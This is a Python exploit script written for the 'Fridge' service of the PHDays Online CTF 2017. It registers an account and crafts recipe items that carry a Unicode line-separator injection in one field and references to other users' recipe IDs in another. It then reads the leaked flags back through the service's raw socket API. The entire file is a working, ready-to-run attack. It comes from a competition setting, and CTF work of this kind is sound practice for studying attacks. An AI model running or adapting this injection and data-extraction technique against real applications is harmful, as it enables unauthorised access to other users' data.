import functools

import requests
from bs4 import BeautifulSoup
import sys
import logging
import random
import string
import time
import socket
import json


L_SEP = '\u2028'
P_SEP = '\u2029'


def add_csrf_token(function, cookies):
    @functools.wraps(function)
    def new_function(*args, **kwargs):
        data = kwargs.get('data', {})
        data['csrfmiddlewaretoken'] = cookies.get('csrftoken')
        kwargs['data'] = data
        return function(*args, **kwargs)

    return new_function


class FridgeExploit:
    web_port = 8000
    api_port = 9595

    def __init__(self, host):
        self.host = host
        self.base_url = 'http://%s:%d' % (self.host, self.web_port)
        self.random_string = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        self.session = requests.Session()
        self.session.post = add_csrf_token(self.session.post, self.session.cookies)

    def run(self):
        logging.info('Running exploit on %s', hostname)

        # Get CSRF cookie
        self.session.get(self.base_url)

        logging.info('Universal random string is %s' % self.random_string)

        password = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        self.create_user(self.random_string, password)
        self.add_food_type(self.random_string, self.random_string)
        refrigerator_id = self.add_refrigerator(self.random_string, self.random_string)
        recipe_id = self.add_recipe(self.random_string, self.random_string)
        self.add_food_to_refrigerator(refrigerator_id, self.random_string)

        logging.info('My recipe id is %d' % recipe_id)
        for delta in range(1, 10):
            new_recipe_id = self.add_recipe(self.random_string, self.random_string)
            logging.info('Now i will add special item to my recipe which can help me to extract flag from recipe #%d' % (recipe_id - delta))
            self.add_hackable_item_to_recipe(new_recipe_id, self.random_string, hack_recipe=recipe_id-delta)

        logging.info('Sleep for 5 seconds...')
        time.sleep(5)
        self.session.get(self.base_url)
        logging.info('Sleep for 1 second...')
        time.sleep(1)

        flags_data = list(self.extract_flags_from_api(self.random_string, password, refrigerator_id))
        logging.info('Extracted: %s' % flags_data)
        logging.info('Do you see flags here?')

    def create_user(self, username, password):
        logging.info('Register user %s with password %s' % (username, password))
        r = self.session.post(self.base_url + '/accounts/register/', data={
            'username': username,
            'password1': password,
            'password2': password,
        })
        if not r.ok:
            raise ServiceError('Can\'t register new user. Status code: %d' % r.status_code)

    def add_food_type(self, name, description):
        logging.info('Add food type %s with description %s' % (name, description))
        r = self.session.post(self.base_url + '/foods/add/', data={
            'name': name,
            'description': description,
            'unit': 1,
        })
        if not r.ok:
            raise ServiceError('Can\'t add food type. Status code: %d' % r.status_code)

    def add_refrigerator(self, title, description):
        logging.info('Add refrigerator %s with description %s' % (title, description))
        r = self.session.post(self.base_url + '/refrigerators/add/', data={
            'title': title,
            'description': description,
        })
        if not r.ok:
            raise ServiceError('Can\'t add refrigerator. Status code: %d' % r.status_code)

        # r.url is something about /refrigerators/100/
        return int(r.url.split('/')[-2])

    def add_recipe(self, title, description):
        logging.info('Add recipe %s with description %s' % (title, description))
        r = self.session.post(self.base_url + '/recipes/add/', data={
            'title': title,
            'description': description,
        })
        if not r.ok:
            raise ServiceError('Can\'t add recipe. Status code: %d' % r.status_code)

        # r.url is something about /recipes/200/
        return int(r.url.split('/')[-2])

    @staticmethod
    def _get_food_type_from_page(response, food_type_name):
        soup = BeautifulSoup(response.text, 'html.parser')
        select = soup.find_all('select', {'name': 'food_type'})[0]
        food_type_id = None
        for option in select.find_all('option'):
            if option.text == food_type_name:
                food_type_id = option['value']

        if food_type_id is None:
            raise ServiceError('Can\'t find food selector on page %s' % response.url)
        return food_type_id

    def add_food_to_refrigerator(self, refrigerator_id, food_type_name):
        logging.info('Add food to the refrigerator #%d' % refrigerator_id)
        r = self.session.get(self.base_url + '/refrigerators/%d/' % refrigerator_id)
        if not r.ok:
            raise ServiceError('Can\'t view refrigerator %d. Status code: %d' % (
                refrigerator_id,
                r.status_code
            ))

        food_type_id = self._get_food_type_from_page(r, food_type_name)
        r = self.session.post(self.base_url + '/refrigerators/%d/add/' % refrigerator_id, data={
            'food_type': food_type_id,
            'count': 100500,
        })
        if not r.ok:
            raise ServiceError('Can\'t add food to the refrigerator %d. Status code: %d' % (
                refrigerator_id,
                r.status_code
            ))

    def add_hackable_item_to_recipe(self, recipe_id, food_type_name, hack_recipe):
        r = self.session.get(self.base_url + '/recipes/%d/' % recipe_id)
        if not r.ok:
            raise ServiceError('Can\'t view recipe %d. Status code: %d' % (
                recipe_id,
                r.status_code
            ))

        food_type_id = self._get_food_type_from_page(r, food_type_name)
        r = self.session.post(self.base_url + '/recipes/%d/add/' % recipe_id, data={
            'food_type': food_type_id,
            'what_to_do': 'blablabla' + L_SEP + str(random.randint(10000, 20000)),
            'count': hack_recipe,
            'pause_after': food_type_id,
        })
        if not r.ok:
            raise ServiceError('Can\'t add item to the recipe %d. Status code: %d' % (
                recipe_id,
                r.status_code
            ))

    def read_line(self, socket):
        char = b''
        buffer = b''
        while char != b'\n':
            buffer += char
            char = socket.recv(1)
            if len(char) == 0:
                break
        return buffer.decode()

    def extract_flags_from_api(self, username, password, refrigerator_id):
        connection = socket.create_connection((self.host, self.api_port))
        message = 'RECIPES %s %s %d\n' % (username, password, refrigerator_id)
        logging.info('Send to API: %s' % message)
        connection.send(message.encode())

        count = json.loads(self.read_line(connection))['count']
        for i in range(count):
            yield self.read_line(connection)


class ServiceError(Exception):
    pass


if __name__ == '__main__':
    logging.basicConfig(format='%(asctime)-15s [%(levelname)s] %(message)s', level=logging.INFO)

    logging.info('It is exploit for the Fridge service, PHDays Online CTF 2017')
    logging.info('Author: Andrew Gein aka andgein, Hackerdom team')
    if len(sys.argv) != 2:
        logging.error('USAGE: ./%s <host>', sys.argv[0])
        sys.exit(1)

    hostname = sys.argv[1]

    FridgeExploit(hostname).run()
